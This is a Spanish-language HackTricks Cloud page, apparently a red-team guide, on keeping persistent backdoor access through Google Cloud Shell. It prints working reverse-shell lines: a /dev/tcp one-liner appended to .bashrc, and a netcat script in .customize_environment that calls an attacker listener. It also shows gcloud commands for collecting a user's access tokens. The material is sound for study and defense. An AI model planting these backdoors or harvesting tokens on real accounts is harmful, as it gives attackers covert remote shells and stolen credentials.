# GCP - Persistencia de Cloud Shell

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de HackTricks en AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
*
*
* repositorios de github.

</details>

## Cloud Shell

Para m치s informaci칩n consulta:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Puerta trasera persistente

[**Google Cloud Shell**](https://cloud.google.com/shell/) te proporciona acceso a la l칤nea de comandos a tus recursos en la nube directamente desde tu navegador sin ning칰n costo asociado.

Puedes acceder al Cloud Shell de Google desde la **consola web** o ejecutando **`gcloud cloud-shell ssh`**.

Esta consola tiene algunas capacidades interesantes para los atacantes:

1. **Cualquier usuario de Google con acceso a Google Cloud** tiene acceso a una instancia de Cloud Shell completamente autenticada (las Cuentas de Servicio pueden, incluso siendo Propietarios de la organizaci칩n).
2. Dicha instancia **mantendr치 su directorio de inicio durante al menos 120 d칤as** si no hay actividad.
3. No hay **capacidades para que una organizaci칩n supervise** la actividad de esa instancia.

B치sicamente esto significa que un atacante puede colocar una puerta trasera en el directorio de inicio del usuario y siempre que el usuario se conecte al GC Shell cada 120 d칤as al menos, la puerta trasera sobrevivir치 y el atacante obtendr치 una shell cada vez que se ejecute simplemente haciendo:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Hay otro archivo en la carpeta de inicio llamado **`.customize_environment`** que, si existe, se va a **ejecutar cada vez** que el usuario acceda a la **nube shell** (como en la t칠cnica anterior). Simplemente inserta la puerta trasera anterior o una similar para mantener la persistencia siempre que el usuario use "frecuentemente" la nube shell:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Es importante tener en cuenta que la **primera vez que se realiza una acci칩n que requiere autenticaci칩n**, aparece una ventana emergente de autorizaci칩n en el navegador del usuario. Esta ventana debe ser aceptada antes de que el comando pueda ejecutarse. Si aparece una ventana emergente inesperada, podr칤a levantar sospechas y comprometer potencialmente el m칠todo de persistencia que se est치 utilizando.
{% endhint %}

Esta es la ventana emergente al ejecutar `gcloud projects list` desde la terminal en la nube (como atacante) vista en la sesi칩n del usuario del navegador:

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Sin embargo, si el usuario ha utilizado activamente la terminal en la nube, la ventana emergente no aparecer치 y puedes **recopilar tokens del usuario con**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### C칩mo se establece la conexi칩n SSH

B치sicamente, se utilizan estas 3 llamadas a la API:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (te permitir치 agregar tu clave p칰blica creada localmente)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (te permitir치 iniciar la instancia)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (te dir치 la direcci칩n IP de la nube de Google)

Pero puedes encontrar m치s informaci칩n en [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Referencias

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* 춰Consulta los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
